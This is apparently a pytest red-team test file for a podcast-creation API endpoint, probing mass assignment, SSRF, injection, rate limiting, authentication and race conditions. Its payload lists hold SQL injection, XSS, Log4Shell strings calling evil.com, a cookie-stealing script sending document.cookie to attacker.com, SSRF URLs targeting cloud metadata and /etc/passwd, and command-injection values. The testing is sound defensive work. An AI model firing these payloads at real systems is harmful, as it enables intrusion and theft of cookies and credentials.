"""T269: Podcast CREATE redteam security tests.

Red Team security tests for Podcast CREATE endpoint.
Tests for BOPLA (mass assignment), injection, SSRF, and other vulnerabilities.
Uses SecLists for comprehensive fuzzing.
"""

import json
import time

import pytest

from model_bakery import baker
from sdk import now

from api.podcasts.models import Podcast
from api.core.models.role import Role
from api.core.models.user import User


# =============================================================================
# SecLists Payloads
# =============================================================================

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE podcast--",
    "' UNION SELECT * FROM pg_authid--",
    "<script>alert(1)</script>",
    "${jndi:ldap://evil.com}",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'\"><svg/onload=alert(1)>",
]

SSRF_URLS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "file:///etc/passwd",
    "dict://localhost:11211/",
    "gopher://localhost:9000/",
    "ftp://anonymous@localhost/",
]

NAUGHTY_STRINGS = [
    "null", "NULL", "undefined", "None",
    "${jndi:ldap://evil.com}",
    "__proto__", "constructor",
    "\x00", "\x80",
    "🎧🎤🎵",
    "../", "..\\",
]


# =============================================================================
# API3:2023 BOPLA - Mass Assignment
# =============================================================================

@pytest.mark.django_db
class TestPodcastCreateRedTeamBOPLA:
    """API3:2023 Broken Object Property Level Authorization - Mass Assignment."""

    def test_bopla_mass_assignment_owner_id(self, api_client, admin_user, regular_user, fake_url, fake_catch_phrase):
        """
        BOPLA: Try to create podcast with arbitrary owner_id.
        
        Should not allow setting owner to another user.
        """
        # Try to assign ownership to admin while being regular_user
        api_client.force_authenticate(user=regular_user)
        
        data = {
            "url": fake_url,
            "title": fake_catch_phrase,
            "owner": admin_user.id,  # Try to assign to admin
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        if response.status_code == 201:
            result = response.json()
            if result.get("owner") == admin_user.id:
                pytest.xfail("T701: BOPLA - Mass assignment of owner_id works")

    def test_bopla_mass_assignment_own_user_id(self, api_client, regular_user, fake_url, fake_catch_phrase):
        """
        BOPLA: Try to set owner to self (should work or be auto-assigned).
        """
        api_client.force_authenticate(user=regular_user)
        
        data = {
            "url": fake_url,
            "title": fake_catch_phrase,
            "owner": regular_user.id,
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")
        
        # If 201 and owner is set correctly, BOPLA may exist
        if response.status_code == 201:
            result = response.json()
            # Owner should be auto-assigned or match
            pass

    def test_bopla_mass_assignment_id_field(self, api_client, admin_user, fake_url, fake_catch_phrase):
        """
        BOPLA: Try to create podcast with specific ID (IDOR).
        
        Attempting to set id field directly.
        """
        target_id = 999999
        
        data = {
            "id": target_id,
            "url": fake_url,
            "title": fake_catch_phrase,
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        if response.status_code == 201:
            result = response.json()
            if result.get("id") == target_id:
                pytest.xfail("T702: BOPLA - ID assignment works (IDOR)")

    def test_bopla_extra_fields_ignored(self, api_client, admin_user, fake_url, fake_catch_phrase):
        """
        BOPLA: Extra fields in request should be rejected, not ignored.
        
        API3:2023 - Accepting unknown fields is a vulnerability.
        """
        data = {
            "url": fake_url,
            "title": fake_catch_phrase,
            "is_admin": True,  # Unknown field
            "role": "admin",   # Unknown field
            "internal": True,  # Unknown field
            "created_by_system": True,  # Unknown field
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        # Should reject with 400, not silently ignore
        if response.status_code == 201:
            pytest.xfail("T703: BOPLA - Extra fields silently ignored")

    def test_bopla_readonly_fields_in_create(self, api_client, admin_user, fake_url, fake_catch_phrase):
        """
        BOPLA: Try to set read-only fields during creation.
        """
        data = {
            "url": fake_url,
            "title": fake_catch_phrase,
            "created_at": "2020-01-01T00:00:00Z",  # Should be auto-set
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        if response.status_code == 201:
            result = response.json()
            # If created_at was accepted, BOPLA exists
            if result.get("created_at") == "2020-01-01T00:00:00Z":
                pytest.xfail("T704: BOPLA - Read-only created_at can be set")


# =============================================================================
# API7:2023 SSRF - Server Side Request Forgery
# =============================================================================

@pytest.mark.django_db
class TestPodcastCreateRedTeamSSRF:
    """API7:2023 Server Side Request Forgery via URL field."""

    def test_ssrf_internal_url_in_podcast_url(self, api_client, admin_user):
        """
        SSRF: Try to create podcast with internal URL.
        
        If server validates/fetches URL, it may access internal resources.
        """
        for url in SSRF_URLS[:5]:
            data = {
                "url": url,
                "title": "SSRF Test",
            }

            response = api_client.post("/api/v2/podcasts", data, format="json")

            # If response contains internal data or takes long time, SSRF exists
            if response.status_code == 500:
                error_text = str(response.content).lower()
                if any(indicator in error_text for indicator in ["root:", "localhost", "connection refused"]):
                    pytest.xfail(f"T705: SSRF via URL field: {url}")

    def test_ssrf_url_with_credentials(self, api_client, admin_user):
        """
        SSRF: URL with embedded credentials.
        """
        data = {
            "url": "http://admin:secret@internal-service/admin",
            "title": "SSRF Credentials",
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")
        
        # Check if credentials are stored (info leak)
        if response.status_code == 201:
            result = response.json()
            if "admin:secret" in str(result.get("url", "")):
                pytest.xfail("T706: URL credentials stored in plaintext")

    def test_ssrf_redirector_url(self, api_client, admin_user):
        """
        SSRF: URL that redirects to internal resources.
        """
        redirector_urls = [
            "https://httpbin.org/redirect-to?url=http://169.254.169.254/",
            "https://tinyurl.com/internal-metadata",  # If configured
        ]

        for url in redirector_urls:
            data = {
                "url": url,
                "title": "Redirector Test",
            }

            start = time.time()
            response = api_client.post("/api/v2/podcasts", data, format="json")
            duration = time.time() - start

            # Time-based detection
            if duration > 2:
                pytest.xfail(f"T707: SSRF redirector time-based: {duration:.2f}s")


# =============================================================================
# API8:2023 Injection (XSS, SQLi)
# =============================================================================

@pytest.mark.django_db
class TestPodcastCreateRedTeamInjection:
    """Injection attacks via CREATE fields."""

    def test_stored_xss_in_title(self, api_client, admin_user):
        """
        XSS: Script in title field (Stored XSS).
        """
        for payload in XSS_PAYLOADS[:3]:
            data = {
                "url": "https://example.com/xss.rss",
                "title": payload,
            }

            response = api_client.post("/api/v2/podcasts", data, format="json")

            if response.status_code == 201:
                result = response.json()
                # If payload is stored without sanitization
                if payload in str(result.get("title", "")):
                    pytest.xfail(f"T708: Stored XSS in title: {payload[:30]}")

    def test_stored_xss_in_description(self, api_client, admin_user):
        """
        XSS: Script in description field.
        """
        payload = "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
        
        data = {
            "url": "https://example.com/xss2.rss",
            "title": "XSS Test",
            "description": payload,
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        if response.status_code == 201:
            result = response.json()
            if payload in str(result.get("description", "")):
                pytest.xfail("T709: Stored XSS in description")

    def test_stored_xss_in_itunes_fields(self, api_client, admin_user):
        """
        XSS: Script in iTunes metadata fields.
        """
        data = {
            "url": "https://example.com/xss3.rss",
            "title": "XSS iTunes",
            "itunes_author": "<img src=x onerror=alert(1)>",
            "itunes_summary": "<svg onload=alert(1)>",
            "itunes_subtitle": "<script>alert(1)</script>",
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        if response.status_code == 201:
            result = response.json()
            xss_fields = ["itunes_author", "itunes_summary", "itunes_subtitle"]
            for field in xss_fields:
                if "<script>" in str(result.get(field, "")) or "onerror=" in str(result.get(field, "")):
                    pytest.xfail(f"T710: Stored XSS in {field}")

    def test_sqli_in_title_field(self, api_client, admin_user):
        """
        SQLi: SQL injection in title field.
        """
        for payload in SQLI_PAYLOADS[:3]:
            data = {
                "url": "https://example.com/sqli.rss",
                "title": payload,
            }

            response = api_client.post("/api/v2/podcasts", data, format="json")

            if response.status_code == 500:
                error_text = str(response.content).lower()
                if "sql" in error_text or "syntax" in error_text:
                    pytest.xfail(f"T711: SQLi in title causes 500: {payload[:30]}")

    def test_command_injection_in_url(self, api_client, admin_user):
        """
        Command injection via URL field.
        """
        cmd_payloads = [
            "https://example.com;id",
            "https://example.com|whoami",
            "https://example.com`id`",
            "$(id)@example.com",
        ]

        for payload in cmd_payloads:
            data = {
                "url": payload,
                "title": "CMD Injection",
            }

            response = api_client.post("/api/v2/podcasts", data, format="json")

            if response.status_code == 500:
                error_text = str(response.content).lower()
                if "uid=" in error_text or "command" in error_text:
                    pytest.xfail(f"T712: Command injection in URL: {payload}")


# =============================================================================
# API4:2023 Resource Consumption
# =============================================================================

@pytest.mark.django_db
class TestPodcastCreateRedTeamResourceConsumption:
    """Resource consumption and DoS tests."""

    def test_rapid_create_requests(self, api_client, admin_user, fake_url, fake_catch_phrase):
        """
        Rate limiting: Rapid CREATE requests.
        """
        success_count = 0
        for i in range(30):
            data = {
                "url": f"{fake_url}/rapid{i}",
                "title": f"{fake_catch_phrase} {i}",
            }
            response = api_client.post("/api/v2/podcasts", data, format="json")
            if response.status_code == 201:
                success_count += 1

        if success_count == 30:
            pytest.xfail("T713: No rate limiting on Podcast CREATE (30 req/s)")

    def test_very_long_title(self, api_client, admin_user, fake_url):
        """
        Resource consumption: Very long title (10K chars).
        """
        data = {
            "url": fake_url,
            "title": "A" * 10000,
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        # Should reject or truncate, not cause memory issues
        if response.status_code == 500:
            pytest.xfail("T714: Very long title causes 500")

    def test_very_long_url(self, api_client, admin_user):
        """
        Resource consumption: URL beyond max length.
        """
        data = {
            "url": "https://example.com/" + "a" * 10000,
            "title": "Long URL Test",
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        if response.status_code == 500:
            pytest.xfail("T715: Very long URL causes 500")

    def test_deeply_nested_json(self, api_client, admin_user):
        """
        Resource consumption: Deeply nested JSON body.
        """
        # Create deeply nested structure
        nested = {"url": "https://example.com/nested.rss", "title": "Nested"}
        for _ in range(100):
            nested = {"data": nested}

        response = api_client.post(
            "/api/v2/podcasts",
            nested,
            format="json"
        )

        if response.status_code == 500:
            pytest.xfail("T716: Deeply nested JSON causes 500")


# =============================================================================
# API2:2023 Broken Authentication
# =============================================================================

@pytest.mark.django_db
class TestPodcastCreateRedTeamAuthentication:
    """Authentication bypass tests."""

    def test_create_no_auth(self, api_client, fake_url, fake_catch_phrase):
        """
        Unauthenticated CREATE should fail.
        """
        api_client.logout()
        
        data = {
            "url": fake_url,
            "title": fake_catch_phrase,
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")
        assert response.status_code == 403

    def test_create_as_guest_user(self, api_client, guest_user, fake_url, fake_catch_phrase):
        """
        BFLA: Guest user should not be able to create podcasts.
        """
        api_client.force_authenticate(user=guest_user)
        
        data = {
            "url": fake_url,
            "title": fake_catch_phrase,
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")
        
        if response.status_code == 201:
            pytest.xfail("T717: BFLA - Guest user can create podcasts")

    def test_create_with_invalid_token(self, api_client, fake_url, fake_catch_phrase):
        """
        Invalid token should fail.
        """
        api_client.logout()
        api_client.credentials(HTTP_AUTHORIZATION="Bearer invalid_token_12345")
        
        data = {
            "url": fake_url,
            "title": fake_catch_phrase,
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")
        assert response.status_code == 403


# =============================================================================
# Business Logic & Fuzzing
# =============================================================================

@pytest.mark.django_db
class TestPodcastCreateRedTeamFuzzing:
    """Fuzzing and business logic tests."""

    def test_naughty_strings_in_fields(self, api_client, admin_user, fake_url):
        """
        Fuzz all fields with naughty strings.
        """
        for payload in NAUGHTY_STRINGS[:5]:
            data = {
                "url": fake_url,
                "title": payload,
                "description": payload,
            }

            response = api_client.post("/api/v2/podcasts", data, format="json")
            
            if response.status_code == 500:
                pytest.xfail(f"T718: Naughty string causes 500: {payload[:20]}")

    def test_null_bytes_in_strings(self, api_client, admin_user, fake_url):
        """
        Null byte injection in fields.
        """
        data = {
            "url": fake_url + "\x00",
            "title": "Test\x00",
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        if response.status_code == 500:
            pytest.xfail("T719: Null byte causes 500")

    def test_crlf_injection_in_url(self, api_client, admin_user):
        """
        CRLF injection in URL field.
        """
        data = {
            "url": "https://example.com%0d%0aSet-Cookie: evil=true",
            "title": "CRLF Test",
        }

        response = api_client.post("/api/v2/podcasts", data, format="json")

        # Check if CRLF was accepted (response splitting potential)
        if "evil=true" in str(response.headers):
            pytest.xfail("T720: CRLF injection in URL (response splitting)")

    def test_invalid_url_formats(self, api_client, admin_user):
        """
        Invalid URL formats should be rejected.
        """
        invalid_urls = [
            "not_a_url",
            "ftp://example.com",  # May be valid depending on requirements
            "://missing-scheme",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]

        for url in invalid_urls:
            data = {
                "url": url,
                "title": "Invalid URL Test",
            }

            response = api_client.post("/api/v2/podcasts", data, format="json")
            
            # Some invalid URLs may be accepted (potential issue)
            if url == "javascript:alert(1)" and response.status_code == 201:
                pytest.xfail("T721: JavaScript URL accepted (XSS vector)")

    def test_unicode_normalization_in_url(self, api_client, admin_user):
        """
        Unicode normalization attacks in URL.
        """
        homograph_urls = [
            "https://еxample.com",  # Cyrillic е instead of Latin e
            "https://ｅｘａｍｐｌｅ.com",  # Full-width characters
        ]

        for url in homograph_urls:
            data = {
                "url": url,
                "title": "Homograph Test",
            }

            response = api_client.post("/api/v2/podcasts", data, format="json")
            
            # If accepted, could be used for phishing
            if response.status_code == 201:
                result = response.json()
                # Check if URL was normalized
                if url in str(result.get("url", "")):
                    pass  # Stored as-is (homograph attack possible)


# =============================================================================
# Race Condition Tests
# =============================================================================

@pytest.mark.django_db
class TestPodcastCreateRedTeamRaceConditions:
    """Race condition tests."""

    def test_duplicate_creation_race(self, api_client, admin_user, fake_url):
        """
        Race condition: Creating same resource twice simultaneously.
        
        May result in duplicate entries if no unique constraint.
        """
        import threading
        import concurrent.futures

        results = []

        def create_podcast():
            data = {
                "url": fake_url,
                "title": "Race Test",
            }
            return api_client.post("/api/v2/podcasts", data, format="json").status_code

        # Fire 5 concurrent creation attempts
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(create_podcast) for _ in range(5)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        success_count = results.count(201)
        
        # If more than 1 succeeded without unique constraint, race condition
        if success_count > 1:
            pytest.xfail(f"T722: Race condition - {success_count} duplicates created")
